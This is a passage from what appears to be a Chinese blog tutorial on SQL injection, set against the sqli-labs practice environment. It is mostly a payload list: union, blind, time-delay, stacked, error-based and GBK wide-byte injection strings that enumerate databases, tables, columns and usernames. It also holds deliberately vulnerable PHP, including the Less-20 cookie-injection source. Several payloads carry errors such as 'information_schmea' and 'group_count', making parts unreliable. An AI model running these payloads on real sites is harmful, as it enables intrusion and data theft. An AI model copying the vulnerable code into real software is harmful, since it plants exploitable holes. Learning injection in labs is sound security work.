class="number">2</span>,<span class="number">3</span>是上一步跑出来的</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span> 获取数据库名称</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>(),<span class="number">3</span> 获取数据库用户名称</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">version</span>(),<span class="number">3</span> 获取数据库版本</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_count(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schmea.tables <span class="keyword">where</span> table_schema=<span class="number">0x7365637572697479</span> 获取表名，这里<span class="number">0x7365637572697479</span>是数据库表名的<span class="keyword">hex</span>编码,<span class="keyword">group</span> <span class="keyword">count</span>获取全部的意思</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_count(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="number">0x7573657273</span> 获取字段名称</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,username,<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">users</span> 获取数据</span><br></pre></td></tr></table></figure></p><p>盲注语句：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">and(length(database())=8) 猜解数据库长度，页面错误的前一个即是长度</span><br><span class="line">and(left(database(),8)="security") 猜解数据库名称</span><br><span class="line">and(1=(<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">"security"</span>)) 猜解表的个数，直到页面正确为止</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">"security"</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) 猜解表名的长度，直到页面返回错误的前一个</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">"security"</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">105</span> 猜解表名，<span class="number">105</span>是<span class="keyword">ascii</span>码</span><br><span class="line"><span class="keyword">and</span>(<span class="number">1</span>=(<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schmea.columns <span class="keyword">where</span> table_name=<span class="string">"users"</span>)) 猜解字段的个数</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"users"</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)) 猜解字段长度</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"users"</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>))=<span class="number">98</span> 猜解字段名称</span><br><span class="line"><span class="keyword">and</span>(<span class="number">1</span>=(<span class="keyword">select</span> <span class="keyword">count</span>(username) <span class="keyword">from</span> <span class="keyword">users</span>)) 猜解数据个数</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) 猜解数据长度</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">150</span> 猜解数据</span><br></pre></td></tr></table></figure></p><p>延时注入语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">and sleep(if((length(database())=8),1,4)) 猜解数据库长度，若是长度正确浏览器请求1秒</span><br><span class="line">and sleep(if((left(database(),8)="security"),1,4))猜解数据库名称</span><br><span class="line">and sleep(if((1=(<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">"security"</span>)),<span class="number">1</span>,<span class="number">4</span>)) 猜解表的个数</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>((<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">"security"</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))),<span class="number">1</span>,<span class="number">4</span>)) 猜解表的长度</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>((<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">"security"</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">105</span>),<span class="number">1</span>,<span class="number">4</span>)) 猜解表名</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>((<span class="number">1</span>=(<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schmea.columns <span class="keyword">where</span> table_name=<span class="string">"users"</span>)),<span class="number">1</span>,<span class="number">4</span>)) 猜解字段个数</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>((<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"users"</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>))),<span class="number">1</span>,<span class="number">4</span>)) 猜解字段长度</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>((<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"users"</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>))=<span class="number">98</span>),<span class="number">1</span>,<span class="number">4</span>)) 猜解字段名</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>((<span class="number">1</span>=(<span class="keyword">select</span> <span class="keyword">count</span>(username) <span class="keyword">from</span> <span class="keyword">users</span>)),<span class="number">1</span>,<span class="number">4</span>)) 猜解数据长度</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>((<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))),<span class="number">1</span>,<span class="number">4</span>)) 猜解数个数</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>((<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">150</span>),<span class="number">1</span>,<span class="number">4</span>)) 猜解数据</span><br></pre></td></tr></table></figure></p><p>堆叠注入语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">公式：;select if((盲注语句),sleep(1),sleep(4))</span><br></pre></td></tr></table></figure></p><p>报错注入语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(select user()),0x7e),1) select user()改为自己的注入语句</span><br></pre></td></tr></table></figure></p><p>POST注入就是请求的方式不同</p><p>宽字节注入<br>说明：由于数据库编码为GBK利用GBK编码构造特殊字符绕过过滤<br>过滤代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn=mysql_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">mysql_select_db(<span class="string">'security'</span>,$conn);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES 'gbk'"</span>,$conn);</span><br><span class="line">$id=addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHEN id='$id' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$result=mysql_query($sql,$conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line">$row=mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $row[<span class="string">'username'</span>].<span class="string">":"</span>.$row[<span class="string">'address'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>&lt;?php<br>$conn=mysql_connect(‘127.0.0.1’,’root’,’root’) or die(‘bad!’);<br>mysql_select_db(‘security’,$conn);<br>mysql_query(“SET NAMES ‘gbk’”,$conn);<br>$id=addslashes($_GET[‘id’]);<br>$sql=”SELECT * FROM users WHEN id=’$id’ LIMIT 0,1”;<br>echo $sql.”<br>“;<br>$result=mysql_query($sql,$conn) or die(mysql_error());<br>$row=mysql_fetch_array($result);<br>if($row){<br>    echo $row[‘username’].”:”.$row[‘address’];<br>}else{<br>    print_r(mysql_error());<br>}</p><p>?&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%df &apos;</span><br><span class="line">%df and 1=1</span><br><span class="line">%df and 1=2</span><br></pre></td></tr></table></figure><p>结果如下：<br><img src="https://s2.ax1x.com/2019/01/31/k1UQMt.png" alt="k1UQMt.png"></p><p>cookie注入<br>将网获取到的cookie写入数据库，但是没做好过滤措施导致注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line">这里的注入拿sqli-labs第20关来说明：</span><br><span class="line"></span><br><span class="line">以下是sqli-labs/Less/20关的代码：</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;Less-20 Cookie Injection- Error Based- string&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;); /*包含该php文件*/</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_COOKIE[&apos;uname&apos;])) /*如果变量不存在则执行*/</span><br><span class="line">&#123;</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;div style=&apos; margin-top:20px;color:#FFF; font-size:24px; text-align:center&apos;&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&apos;#FF0000&apos;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;&quot;;</span><br><span class="line">echo &quot;&lt;div  align=&apos;center&apos; style=&apos;margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;&apos;&gt;&quot;;</span><br><span class="line">echo &quot;&lt;div style=&apos;padding-top:10px; font-size:15px;&apos;&gt;&quot;;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">echo &quot;&lt;!--Form to post the contents --&gt;&quot;;</span><br><span class="line">echo &apos;&lt;form action=&quot; &quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;&apos;;</span><br><span class="line"></span><br><span class="line">echo &apos; &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;&apos;;</span><br><span class="line">echo &apos;   &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;  &lt;/div&gt;&apos;;</span><br><span class="line">  </span><br><span class="line">echo &apos; &lt;div&gt; Password : &amp;nbsp; &amp;nbsp; &amp;nbsp;&apos;;</span><br><span class="line">echo &apos;   &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;&lt;/div&gt;&lt;/br&gt;&apos;;</span><br><span class="line">echo &apos;   &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&apos;;</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;/form&gt;&apos;;</span><br><span class="line">echo &apos;&lt;/div&gt;&apos;;</span><br><span class="line">echo &apos;&lt;/div&gt;&apos;;</span><br><span class="line">echo &apos;&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;&apos;;</span><br><span class="line">echo &apos;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">echo &apos;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">echo &apos;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&apos;;</span><br><span class="line">echo &apos;&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function check_input($value)</span><br><span class="line">&#123;</span><br><span class="line">if(!empty($value)) /*如果变量不为空*/</span><br><span class="line">&#123;</span><br><span class="line">$value = substr($value,0,20); // truncation (see comments) /*从0的位置开始读取，长度为20*/</span><br><span class="line">&#125;</span><br><span class="line">if (get_magic_quotes_gpc())  // Stripslashes if magic quotes enabled /*开启magic_quotes*/</span><br><span class="line">&#123;</span><br><span class="line">$value = stripslashes($value); /*反引用一个引用字符串*/</span><br><span class="line">&#125;</span><br><span class="line">if (!ctype_digit($value))   // Quote if not a number /*纯数字检查*/</span><br><span class="line">&#123;</span><br><span class="line">$value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$value = intval($value); /*取整数*/</span><br><span class="line">&#125;</span><br><span class="line">return $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) /*判断uname和passwd是否存在*/</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">$uname = check_input($_POST[&apos;uname&apos;]); /*调用check_input过滤变量*/</span><br><span class="line">$passwd = check_input($_POST[&apos;passwd&apos;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">$result1 = mysql_query($sql); /*查询数据库*/</span><br><span class="line">$row1 = mysql_fetch_array($result1);</span><br><span class="line">$cookee = $row1[&apos;username&apos;];</span><br><span class="line">if($row1)</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;</span><br><span class="line">setcookie(&apos;uname&apos;, $cookee, time()+3600);</span><br><span class="line">header (&apos;Location: index.php&apos;);</span><br><span class="line">echo &quot;I LOVE YOU COOKIES&quot;;</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&apos;;</span><br><span class="line">//echo &apos;Your Cookie is: &apos; .$cookee;</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;;</span><br><span class="line">//echo &quot;Try again looser&quot;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;;</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">echo &apos;&lt;/font&gt;&apos;;</span><br><span class="line">echo &apos;&lt;/div&gt;&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_POST[&apos;submit&apos;])) /*如果submit不存在*/</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">$cookee = $_COOKIE[&apos;uname&apos;];</span><br><span class="line">$format = &apos;D d M Y - H:i:s&apos;;</span><br><span class="line">$timestamp = time() + 3600;</span><br><span class="line">echo &quot;&lt;center&gt;&quot;;</span><br><span class="line">echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">echo &apos;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&apos;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;;</span><br><span class="line">echo &apos;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&apos;;</span><br><span class="line">echo &quot;YOUR USER AGENT IS : &quot;.$_SERVER[&apos;HTTP_USER_AGENT&apos;];</span><br><span class="line">echo &quot;&lt;/font&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&apos;;</span><br><span class="line">echo &quot;YOUR IP ADDRESS IS : &quot;.$_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">echo &quot;&lt;/font&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&apos;;</span><br><span class="line">echo &quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;orange&quot; font size = 5 &gt;&apos;;</span><br><span class="line">echo &quot;YOUR COOKIE : uname = $cookee and expires: &quot; . date($format, $timestamp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br&gt;&lt;/font&gt;&quot;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE username=&apos;$cookee&apos; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">if (!$result)</span><br><span class="line">  &#123;</span><br><span class="line">  die(&apos;Issue with your mysql: &apos; . mysql_error());</span><br><span class="line">  &#125;</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &apos;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&apos;;</span><br><span class="line">  echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&apos;;  </span><br><span class="line">echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&lt;/b&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;Your ID:&apos; .$row[&apos;id&apos;];</span><br><span class="line">  &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;center&gt;&quot;;</span><br><span class="line">echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">echo &apos;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&apos;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;;</span><br><span class="line">//echo &apos;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">echo &apos;&lt;center&gt;&apos;;</span><br><span class="line">echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;;</span><br><span class="line">echo &apos;&lt;input  